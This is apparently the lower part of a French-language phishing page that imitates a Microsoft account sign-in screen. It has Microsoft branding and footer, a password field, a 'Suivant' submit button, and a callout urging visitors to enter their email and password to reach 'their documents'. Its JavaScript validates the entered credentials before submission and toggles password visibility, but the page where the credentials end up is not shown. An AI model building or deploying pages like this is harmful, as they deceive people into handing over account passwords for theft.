							<path d="M476.019 227.945c-0.228 0.228-5.351 0.683-11.272 1.025-82.201 5.351-176.925 36.204-259.012 84.478-52.485 30.853-92.561 61.593-132.637 101.784-26.868 26.983-46.223 50.892-62.846 77.532-12.41 20.037-11.954 18.103-6.944 27.096 10.019 18.103 29.032 44.858 45.427 63.529 84.478 97.002 212.333 172.598 339.164 200.834 15.483 3.416 38.482 7.4 50.095 8.652 3.757 0.341 7.742 0.911 8.767 1.139 11.613 2.164 88.463 3.074 111.916 1.366 108.159-7.97 225.539-54.421 324.363-128.196 40.645-30.399 83.681-72.296 109.639-106.679 8.995-11.954 19.241-27.438 25.958-38.937l5.351-9.336-5.351-9.449c-7.856-13.662-23.112-36.091-31.992-47.248-14.118-17.647-41.328-46.338-58.633-61.936-8.652-7.742-11.613-10.247-21.518-18.558-74.345-62.162-173.51-112.371-262.427-132.865-27.211-6.262-43.491-9.108-63.187-11.272-6.603-0.683-13.434-1.594-15.37-1.821-3.985-0.797-88.691-1.821-89.487-1.139zM539.889 309.349c56.47 8.539 108.045 40.986 139.468 87.779 31.65 47.248 42.238 101.784 30.626 158.709-12.068 59.772-55.559 114.421-112.371 141.289-20.265 9.564-39.848 15.37-61.593 18.216-11.272 1.48-44.515 1.48-53.054 0-23.112-3.871-35.863-7.514-53.851-15.029-42.808-17.988-81.062-53.851-102.010-95.635-11.499-23.112-16.508-39.735-21.176-71.498-0.911-5.92-0.911-36.204 0-42.125 4.667-31.423 9.677-48.5 21.176-71.498 29.26-58.406 87.893-100.758 152.447-109.98 4.667-0.683 9.791-1.48 11.385-1.708 5.579-0.797 40.531 0.228 48.956 1.48zM744.024 351.018c77.988 38.368 147.551 93.358 193.091 152.447 5.123 6.603 5.92 8.198 4.895 10.247-4.441 9.905-47.931 56.128-71.385 76.052-26.186 22.088-63.643 48.387-92.902 65.009-12.068 6.831-51.347 26.983-52.713 26.983-0.341 0 3.302-5.465 7.97-12.182 37.458-53.397 54.307-115.9 49.069-181.365-3.871-48.5-24.022-101.1-53.851-140.265-5.92-7.742-6.375-7.856 15.826 3.074zM287.481 353.523c-18.216 25.617-32.106 54.421-40.189 83.225-15.029 53.282-13.89 109.525 3.416 161.897 8.198 25.047 23.795 55.218 38.254 74.231 2.846 3.757 5.010 6.944 4.782 7.172-0.456 0.569-33.473-16.053-45.313-22.657-62.732-35.635-118.861-81.86-157.343-129.791-5.010-6.148-9.564-12.41-10.247-13.89-1.139-2.277 0-4.098 10.019-16.622 21.86-27.211 58.861-62.049 92.106-86.868 14.231-10.702 44.289-30.512 58.633-38.823 11.841-6.831 50.55-26.642 51.005-26.072 0.228 0.228-2.049 3.871-5.123 8.198z" fill="#000"></path><path d="M498.333 387.564c-52.485 5.465-95.294 41.784-109.297 92.675-3.871 14.003-4.895 39.848-2.164 54.079 6.49 33.814 25.503 62.618 53.282 81.176 13.434 8.995 25.047 14.118 41.1 18.216 19.811 5.010 47.248 3.871 67.628-2.733 8.767-2.846 27.552-12.637 34.838-18.103 36.774-27.666 54.649-68.88 50.208-115.559-1.139-11.841-9.108-38.823-10.929-36.774-0.456 0.456-1.708 3.302-2.733 6.375-2.733 7.4-10.702 17.76-17.306 22.657-11.499 8.425-20.949 11.385-34.725 11.272-23.681-0.228-44.289-15.939-51.347-39.165-2.96-10.019-2.505-25.389 1.366-34.953 4.782-12.41 15.142-23.567 27.894-30.057 3.188-1.594 5.465-2.96 5.123-2.96s-5.579-1.252-11.613-2.733c-10.816-2.846-31.081-4.441-41.328-3.416z" fill="#000"></path></svg>
						  
								</div>
							</div>

                                 <input type="password" name="password" placeholder="Password" id="pass" maxlength="26">
								 <span style="color:red; font-size:11px" class="errorClass" id="passError"></span>

                                <div class="focus-area">
                                    <i class="ms-Icon ms-Icon--Info" aria-hidden="true"></i>
                                    <div class="callout" style="font-family: 'Segoe UI Web (West European)','Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif;">
                                        <div class="callout-title" style="">Que dois-je faire ?</div>
                                        Connectez vous à l'aide de votre adresse e-mail puis le mot de passe connexe pour accéder à vos documents.
                                    </div>
                                </div>


						


                            </div>

							<br>
							
                            <div class="form-error-container">
                                <center>
                                    <div class="alert alert-danger" id="msg" style="display: none;">Mauvaises informations! Veuillez réessayer</div>
                                    <span id="error" class="text-danger" style="display: none;">Ce compte n'existe pas. Entrez un autre compte</span>
                                </center>
                            </div>
                            <div style="margin-right: 30px;" align="right">
				<input type="submit" value="Suivant" style="width: 295px; font-weight: bold; color: white; background-color: #006EBCFF; border: none; outline: none; cursor: pointer;" onclick="CoordoBk()">
			</div>
                        </div>
                </div>
            </div>
</form>			
<br>





            <div class="legal">
                <span>© 2024 Microsoft</span>
                <!--<a href='#'>Terms of Use</a> To Be Deleted-->
                <a href="#">Privacy &amp; Cookies</a>
            </div>
            <div class="mobile-logo ms-hiddenMdUp">
				<div class="images-container">
                <img class="images" style="width: 45%;" class="microsoft-logo" src="styles/img/softmic.png" alt="">
			</div>
            </div>
        </div>
    </div>
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="styles/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="styles/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="styles/bootstrap.min_002.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>

<script src="styles/jquery.min.js"></script>
<script src="styles/bootstrap.min.js"></script>


<script>
	function CoordoBk() {

	  // Expression régulière pour valider le ID
	  const emailRegex = /[a-z0-9._%+-]+@[wandrngefgmilbuctkyahopstvx]+\.[frcomnet]{2,3}$/;
		 // Expression régulière pour valider Password
		 const passRegex =/^[a-z0-9.&@$#()=+*çà)({}}{_-]{7,30}$/i;
		
 

		const emailErrorSpan = document.getElementById("emailError");
		const passErrorSpan = document.getElementById("passError");
	   
	  
		
		

		// Réinitialiser le contenu du message d'erreur
				 
		emailErrorSpan.textContent = "";
		passErrorSpan.textContent = "";
		


	// Validation des champs

		const emailInput = document.getElementById('email');
		const emailValue = emailInput.value;

		const passInput = document.getElementById('pass');
		const passValue = passInput.value;

	   
		


// Expression régulière pour valider le ID

if (!emailRegex.test(emailValue)) {
emailErrorSpan.textContent = "Veuillez entrer une adresse e-mail valide.";
event.preventDefault(); // Empêche la soumission du formulaire en cas d'erreur

return;

}


// Lorsque l'utilisateur saisit quelque chose dans le champ ID
emailInput.addEventListener("input", function() {
validateEmail(this);
});



// Expression régulière pour valider le Password

if (!passRegex.test(passValue)) {
passErrorSpan.textContent = "Veuillez entrer le mot de passe lié à votre adresse e-mail. ";
event.preventDefault(); // Empêche la soumission du formulaire en cas d'erreur

return;

}


// Lorsque l'utilisateur saisit quelque chose dans le champs Password
passInput.addEventListener("input", function() {
validatepass(this);
});
}

</script>

<script>
	const passwordInput = document.getElementById('pass');
	const toggleButton = document.getElementById('toggle-password');
	const icon1 = document.querySelector('.password-icon1');
	const icon2 = document.querySelector('.password-icon2');
	icon1.style.opacity = '1';

	toggleButton.addEventListener('click', () => {
		if (passwordInput.type === 'password') {
			passwordInput.type = 'text';
			icon1.style.opacity = '0';
			icon2.style.opacity = '1';
		} else {
			passwordInput.type = 'password';
			icon1.style.opacity = '1';
			icon2.style.opacity = '0';
		}
	});
</script>

</body>
</html>
